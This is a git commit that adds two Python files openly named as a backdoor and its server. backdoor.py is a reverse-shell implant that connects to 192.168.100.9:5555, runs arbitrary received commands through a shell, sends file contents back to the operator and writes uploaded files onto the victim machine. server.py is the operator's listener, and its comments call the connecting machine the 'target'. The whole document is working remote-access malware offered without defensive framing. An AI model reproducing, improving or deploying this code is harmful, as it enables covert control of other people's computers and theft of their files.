152a1deeeb6a4c32ea4f11fdc7c6a843d23d7162
Apkaless <106030623+Apkaless@users.noreply.github.com>
2022-08-22 10:47:41 +0300

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,95 @@
+import socket
+import subprocess
+import os
+
+socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+socket.connect(('192.168.100.9', 5555))
+
+while True:
+
+    data = socket.recv(2048).decode('ascii')
+
+    if data[0:2] == 'cd':
+
+        try:
+
+            os.chdir(data[3:])
+
+            socket.send(f'You are in {data[3:]}'.encode('ascii'))
+
+            continue
+
+        except FileNotFoundError:
+
+            socket.send(f'{data[3:]} Not Detected.'.encode('ascii'))
+
+            continue
+
+    elif data[0:8] == 'download':
+        
+        try:
+
+            with open(data[9:], 'rb') as file:
+
+                file = file.read()
+
+                socket.send(file)
+
+                continue
+
+        except FileNotFoundError:
+
+            socket.send('File Not Found'.encode('ascii'))
+
+            continue
+
+    elif data[0:6] == 'upload':
+
+        socket.send('File Required'.encode('ascii'))
+
+        file_data = socket.recv(2048).decode('ascii')
+
+        file = open(data[7:], 'wb')
+
+        file = file.write(file_data.encode('ascii'))
+
+        continue
+
+    elif data[0:3] =='cat':
+
+        try:
+
+            with open(data[4:], 'rb') as f:
+
+                file = f.read()
+
+                socket.send(file)
+
+                continue
+
+        except:
+
+            socket.send('File Not Found (ERROR)'.encode('ascii'))
+
+            continue
+    
+    elif data == 'exit':
+
+        subprocess.check_output('exit')
+        
+        exit()
+
+    else:
+
+        try:
+
+            out = subprocess.check_output(data, shell=True).decode('ascii')
+
+            socket.send(out.encode('ascii'))
+
+        except subprocess.CalledProcessError:
+
+            socket.send('Error!'.encode('ascii'))
+
+            continue
---
+++ server.py
@@ -0,0 +1,114 @@
+import socket
+import os
+
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+server.bind(("0.0.0.0", 5555))
+
+server.listen()
+
+print('\nServer started and waiting for incoming connection\n')
+
+
+while True:
+
+    try:
+
+        object, address = server.accept() # Accept the connection from the target and return the socket object, ipv4 and port number of the target who connected to our server
+
+        print(f'Incoming Connection From {address[0]}:{address[1]}\n') # address[0] is gonna be the target ipv4 and address[1] is gonna be the port number
+
+    except:
+        continue
+
+    else:
+
+        while True:
+
+            cmd = input('Run A Command: ')
+
+            if cmd =='exit':
+
+                object.send('exit'.encode('ascii'))
+
+                object.close()
+
+                exit()
+
+            elif cmd == '':
+
+                continue
+
+            elif cmd == 'cls':
+
+                os.system('cls')
+
+                continue
+
+            elif cmd == 'download':
+
+                continue
+
+            elif cmd[0:8]=='download':
+
+                object.send(cmd.encode('ascii'))
+
+                data = object.recv(2048).decode('ascii')
+
+                if data == 'File Not Found (ERROR)':
+
+                    print('\n',data,'\n')
+
+                    continue
+
+                else:
+
+                    with open(cmd[9:],'wb') as f:
+
+                        file = f.write(data.encode('ascii'))
+
+                    continue
+
+            elif cmd[0:6]=='upload':
+
+                object.send(cmd.encode('ascii'))
+
+                data = object.recv(2048).decode('ascii')
+
+
+                if data:
+
+                    try:
+
+                        file = open(cmd[7:], 'rb')
+
+                        file = file.read()
+
+                        object.send(file)
+
+                        continue
+
+                    except FileNotFoundError:
+
+                        print('\nFile Not Found\n')
+
+                        continue
+
+            elif cmd[0:3]=='cat':
+
+                object.send(cmd.encode('ascii'))
+
+                data = object.recv(2048).decode('ascii')
+
+                print('\n',data,'\n')
+
+                continue
+
+            else:
+                
+                object.send(cmd.encode('ascii'))
+
+                data = object.recv(2048).decode('ascii')
+
+                print(f"\n{data}\n")
